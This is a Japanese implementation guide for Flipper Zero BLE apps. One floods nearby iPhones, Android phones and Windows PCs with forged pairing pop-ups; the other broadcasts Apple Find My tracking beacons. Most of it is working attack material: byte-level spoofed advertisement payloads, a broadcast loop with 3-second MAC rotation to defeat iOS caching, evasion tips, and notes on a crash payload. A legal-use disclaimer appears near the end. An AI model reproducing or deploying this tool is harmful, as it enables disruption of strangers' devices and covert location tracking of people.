# Flipper Zero BLE 实装ガイド — X-BLE Spam / X-FindMy 実装メモ

> 作者: dwgx / 実機検証: Flipper Zero firmware 1.4.3 (OFW) · WB55 BLE stack
> 最終更新: 2026-04-05
> 対象読者: Flipper Zero で BLE 広告系アプリを自作したい開発者
> 目的: 公式 `furi_hal_bt_extra_beacon_*` API だけで Apple Continuity / Fast Pair / Swift Pair / Offline Finding をどう実装したか、再現可能な形で残す

---

## 1. なぜこの文書が存在するのか

**3rd-party BLE アプリを「official firmware」で動かす**ためには、制約が多い。

Flipper Zero の OFW (公式ファームウェア) は、セキュリティと安定性の観点から **外部アプリから叩ける BLE API を極端に絞っている**。Momentum / Xtreme / Unleashed など社外ビルドは `ble_scan` や `ble_central` を解放しているが、OFW でビルドした `.fap` は以下しか使えない:

| API | 用途 | 外部アプリ利用可否 (OFW) |
|---|---|---|
| `furi_hal_bt_extra_beacon_*` | 非接続 Advertisement の差し込み | ✅ 公開 |
| `furi_hal_bt_start_advertising` | GATT peripheral | ✅ 公開 (限定) |
| `ble_scan_*` | 周辺スキャン | ❌ OFW では不可 |
| `ble_central_*` | Central 接続 | ❌ OFW では不可 |
| 生 HCI コマンド | ACI 直叩き | ❌ クラッシュ要因 |

本実装は **100% `furi_hal_bt_extra_beacon_*` のみで構築**した。ACI を叩かないので、BLE スタックが落ちて要再起動、というあの現象は起きない。

---

## 2. 何を実現したか

### X-BLE Spam (`apps/toys/x_ble_spam/`)

非接続 Advertisement を使って、以下のプロトコルの「近接通知」を再現する **39 種類**のデバイス定義を内蔵した単一ファイルアプリ:

| カテゴリ | デバイス例 | Continuity Type |
|---|---|---|
| Apple Proximity Pair | AirPods / AirPods Pro / AirPods Max / Beats / PowerBeats Pro | `0x07` |
| Apple Nearby Action | Apple TV Join / AppleTV Pair / Transfer Number / Join This AppleTV | `0x0F` |
| Samsung EasySetup | Galaxy Buds / Watch | `0xFF 0x75 0x00` |
| Google Fast Pair | Android デバイス (ランダム Model ID) | `0x2CFE` Service |
| Microsoft Swift Pair | Windows 10/11 ペアリング | `0xFF 0x06 0x00` |
| LoveSpouse | おもちゃ側制御プロトコル | 独自 |
| `TypeRotate` | 全デバイスを順に回す | N/A |

### X-FindMy (`apps/toys/x_findmy/`)

Apple **Offline Finding** (OF) ネットワークを使った追跡ビーコンを、SECP224R1 の公開鍵ベースで発信する。

- 初回起動時に楕円曲線鍵ペアを生成、Flipper LFS に保存
- 公開鍵の一部を BLE MAC に埋め込み、残りを Manufacturer Data に積んで `0xFF 0x4C 0x00 0x12 0x19` フレーム (OF ペイロード) として Advertisement
- `.keys` ファイル (OpenHaystack / Macless-Haystack 互換) を import/export 可能 → PC 側で Apple Find My ネットワーク経由の位置取得ができる

---

## 3. アーキテクチャ

```
┌─────────────────────────────────────────────┐
│           x_ble_spam (.fap, single-file)     │
├─────────────────────────────────────────────┤
│  UI Layer                                    │
│    ViewPort + canvas_draw_*                  │
│    InputEvent (Up/Down/Left/Right/OK/Back)   │
├─────────────────────────────────────────────┤
│  State Layer                                 │
│    devs[39]  — デバイス定義テーブル          │
│    current_idx, broadcasting, mac_rotate_ts  │
├─────────────────────────────────────────────┤
│  BLE Layer (public API only)                 │
│    furi_hal_bt_stop_advertising()            │
│    furi_hal_bt_extra_beacon_set_config()     │
│    furi_hal_bt_extra_beacon_set_data()       │
│    furi_hal_bt_extra_beacon_start()          │
│    furi_hal_bt_extra_beacon_stop()           │
├─────────────────────────────────────────────┤
│  HAL (read-only)                             │
│    furi_hal_random_fill_buf()                │
│    furi_hal_light_set() (LED feedback)       │
└─────────────────────────────────────────────┘
```

**重要な設計判断:**

1. **normal BT を止める**: `furi_hal_bt_extra_beacon_*` を呼ぶ前に `furi_hal_bt_stop_advertising()` で通常の BT 広告を停止させる。これをしないと、自分の広告と Flipper の本体広告が競合して受信機側で捕捉されない。
2. **終了時に必ず復元する**: アプリ終了時に extra beacon を止めて、`furi_hal_bt_start_advertising()` を呼び直す。これを忘れると Flipper 本体の BT が死ぬ。
3. **MAC ローテーション**: 固定 MAC だと iOS 側がキャッシュして 2 回目のポップアップが出ない。3 秒毎に `stop → set_config(new_mac) → set_data → start` で MAC を差し替える。
4. **`GapAddressTypeRandom`**: これ必須。Public address だと iOS/macOS は **完全に無視する**。さらに Random Static address のルール (高位 2bit = `0b11`) を満たすため、生成時に `mac[5] |= 0xC0` する。

---

## 4. パケットフォーマット実装詳細

### 4.1 Apple Proximity Pair (AirPods 系)

```c
// 31 bytes max, extra beacon 用 payload
uint8_t payload[27] = {
    0x1E,                       // length (30 = 残り全部)
    0xFF,                       // AD type: Manufacturer Specific
    0x4C, 0x00,                 // Company ID: Apple (little-endian)
    0x07,                       // Continuity: Proximity Pair
    0x19,                       // subtype length
    model_hi, model_lo,         // e.g. 0x07,0x20 = AirPods Pro
    0x55,                       // status byte
    battery1,                   // rand()%16  ← ここ重要
    battery2,                   // rand()%16
    lid_open_counter,           // rand()%256
    dev_color,                  // 0x00 white など
    0x00,                       // padding
    /* 以下 16 bytes の encrypted payload (all-zero でも動く) */
    0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0
};
```

**落とし穴 (実測で踏んだもの):**

- バッテリーバイトを `rand() % 10` にすると Beats Flex / Solo がポップしない。**必ず `rand() % 16`** にする (公式は 4bit フィールドとして解釈している)。
- `0x55` の status byte を変えるとデバイスによって挙動が変わる。AirPods 系は `0x55` 固定で OK。
- `lid_open_counter` をインクリメントせずにランダムにすると「同じデバイス」と認識されずに毎回新規として扱われる。これはこちらの目的に合致している。

### 4.2 Apple Nearby Action

```c
uint8_t payload[14] = {
    0x0D, 0xFF, 0x4C, 0x00,
    0x0F,                       // Continuity: Nearby Action
    0x05,                       // subtype length
    0xC0,                       // flags  ← 通常は 0xC0
    action_type,                // 0x13=Transfer Number, 0x09=AppleTV Pair, etc.
    rand_a, rand_b, rand_c,     // auth tag (rand でも通る)
    0x00, 0x00, 0x00
};
```

**既知の制限:**
- `Setup New iPhone` (action `0x09`) は iOS 16.6+ でパッチ済み。
- `Join AppleTV` は flags を `0xBF` にする必要がある (`0xC0` だと無視される)。
- `iOS17 Crash` (CVE-2023-xxxx 相当) は iOS 17.2 でパッチ済み。

### 4.3 Google Fast Pair

```c
uint8_t payload[14] = {
    0x03, 0x03, 0x2C, 0xFE,     // Complete Service UUIDs: 0xFE2C
    0x06, 0x16, 0x2C, 0xFE,     // Service Data (UUID: 0xFE2C)
    model_id[0], model_id[1], model_id[2],  // Fast Pair Model ID
    0x00, 0x00, 0x00
};
```

Model ID はランダムでも Android がポップする (未登録デバイスとして扱われる)。登録済みの Model ID (e.g. `0xD446B4` = Bose QC35) を使うとブランドアイコン付きで出る。

### 4.4 Microsoft Swift Pair

```c
uint8_t payload[16] = {
    0x0F, 0xFF, 0x06, 0x00,     // Manufacturer: Microsoft
    0x03, 0x00, 0x80,           // Swift Pair header
    0x06,                       // device type: Mouse
    /* Display name (UTF-8) */
    'F','l','i','p','p','e','r','Z'
};
```

Windows 11 は "Add Device" トーストを自動で出す。23H2 以降は頻度制限が入って 3 回連続で出すと 60 秒クールダウンに入る。

---

## 5. コアループ (擬似コード)

```c
static void broadcast_loop(BleSpamApp* app) {
    while(app->running) {
        if(app->broadcasting) {
            // MAC rotation every 3 seconds
            uint32_t now = furi_get_tick();
            if(now - app->mac_rotate_ts > 3000) {
                uint8_t mac[6];
                furi_hal_random_fill_buf(mac, 6);
                mac[5] |= 0xC0;  // Random Static Address marker

                GapExtraBeaconConfig cfg = {
                    .min_adv_interval_ms = 50,
                    .max_adv_interval_ms = 150,
                    .adv_channel_map = GapAdvChannelMapAll,
                    .adv_power_level = GapAdvPowerLevel_0dBm,
                    .address_type = GapAddressTypeRandom,
                };
                memcpy(cfg.address, mac, 6);

                furi_hal_bt_extra_beacon_stop();
                furi_hal_bt_extra_beacon_set_config(&cfg);
                furi_hal_bt_extra_beacon_set_data(
                    app->devs[app->current_idx].payload_builder(),
                    app->devs[app->current_idx].payload_len);
                furi_hal_bt_extra_beacon_start();
                app->mac_rotate_ts = now;
            }
        }
        furi_delay_ms(50);
    }
}
```

---

## 6. 検証手順 (再現可能)

### 6.1 必要なもの
- Flipper Zero 実機 (OFW 0.103+ / 1.4+)
- iPhone (iOS 16 以降 / Apple Proximity Pair 検証用)
- Android 端末 (Google Fast Pair 検証用)
- Windows 11 PC (Swift Pair 検証用)
- nRF Connect (iOS/Android) — 生の Advertisement 確認用

### 6.2 手順

1. `cd $FLIPPER_PROJECT_ROOT/apps/toys/x_ble_spam && ufbt launch`
2. Flipper で `TypeApplePair` を選択、OK で broadcasting 開始 (青 LED)
3. iPhone を 30cm 以内に近づける → 2〜5 秒で AirPods ポップアップが出る
4. nRF Connect で MAC ローテーションを確認 (3 秒毎に別 MAC として出現)
5. 出なかった場合の切り分け:
   - 青 LED が点灯しない → `furi_hal_bt_extra_beacon_set_config` が失敗。address_type を再確認
   - 青 LED は点くが iOS に何も出ない → MAC high bits (`0xC0`) を確認、 payload の subtype を確認
   - nRF Connect では見えるが iOS に出ない → Continuity type byte (`0x07`) を確認

### 6.3 LED カラーコード

| LED | 意味 |
|---|---|
| 青 (ブルー) | BLE extra beacon 起動成功 |
| 赤 | `set_config` or `start` が失敗 |
| 消灯 | broadcast 停止 (OK で再開) |

---

## 7. 既知の制約 (プロトコル側)

これらは **コードのバグではなく、相手 OS 側の仕様**:

| 症状 | 原因 |
|---|---|
| Apple Watch ポップアップに "Not Your Device" と出る | 正常動作。ペアリング時の正当性チェックで弾かれている |
| AirPods Max / Beats Studio が 1 回目しか出ない | デバイス側にクールダウン機構あり |
| `Setup New iPhone` が無反応 | iOS 16.6+ でパッチ済み |
| iOS 17.2 以降で `iOS17 Crash` 通らない | パッチ済み |
| Fast Pair が Android 12 以降で弱体化 | Google が頻度制限を導入 |

---

## 8. OSS として公開する場合の注意点

### 8.1 合法性

この実装は **以下の用途に限定**:
- 自身のデバイスの BLE セキュリティテスト
- BLE プロトコル研究・教育
- BLE スタックの互換性検証

**禁止:**
- 第三者への迷惑行為
- 公共空間での無差別 spam
- 特定個人のデバイスを狙った嫌がらせ

多くの国・地域で **他者の電子機器への意図的な干渉は違法**です。米国 FCC Part 15, 日本電波法 第 59 条、EU RED Directive 2014/53/EU などが該当する。

### 8.2 リポジトリ構成 (提案)

```
x_ble_spam/
├── README.md                  ← プロジェクト概要・合法性注意
├── LICENSE                    ← GPL-3.0 推奨 (Flipper SDK と合わせる)
├── application.fam
├── x_ble_spam.c               ← メインソース
├── devices/                   ← デバイス定義を分離
│   ├── apple_pair.c
│   ├── apple_action.c
│   ├── samsung.c
│   ├── google.c
│   └── microsoft.c
├── docs/
│   ├── ARCHITECTURE.md        ← 本文書の抜粋
│   ├── PACKET_FORMATS.md      ← 各プロトコルのバイト列仕様
│   └── FAQ.md
└── examples/
    └── add_new_device.md      ← デバイス追加の手順
```

### 8.3 貢献ガイドライン (例)

- 新デバイス追加時は **必ず実機で検証**してから PR
- iOS / Android / Windows のバージョンを PR 本文に明記
- パッチ済みプロトコルの PR は受け付けない (害あって益なし)

---

## 9. 関連リソース

| リソース | URL | 用途 |
|---|---|---|
| furi_hal_bt API | `vendor_firmware/ofw_baseline/targets/f7/furi_hal/furi_hal_bt.h` | ローカル参照 |
| Apple Continuity Protocol | https://github.com/furiousMAC/continuity | リバエン資料 |
| Google Fast Pair Spec | https://developers.google.com/nearby/fast-pair/specifications | 公式 |
| Microsoft Swift Pair | https://learn.microsoft.com/en-us/windows-hardware/design/component-guidelines/bluetooth-swift-pair | 公式 |
| Macless-Haystack | https://github.com/dchristl/macless-haystack | FindMy 連携 |
| OpenHaystack | https://github.com/seemoo-lab/openhaystack | FindMy 原典 |

---

## 10. 今後の拡張

- [ ] Tile / SmartTag 系の追加 (Offline Finding と同系統)
- [ ] Continuity v2 (iOS 17+ 新プロトコル) のリバエン
- [ ] GATT peripheral を使った "fake device" モード (`furi_hal_bt_start_advertising` ルート)
- [ ] Web UI (qFlipper plugin) でデバイス定義を動的追加
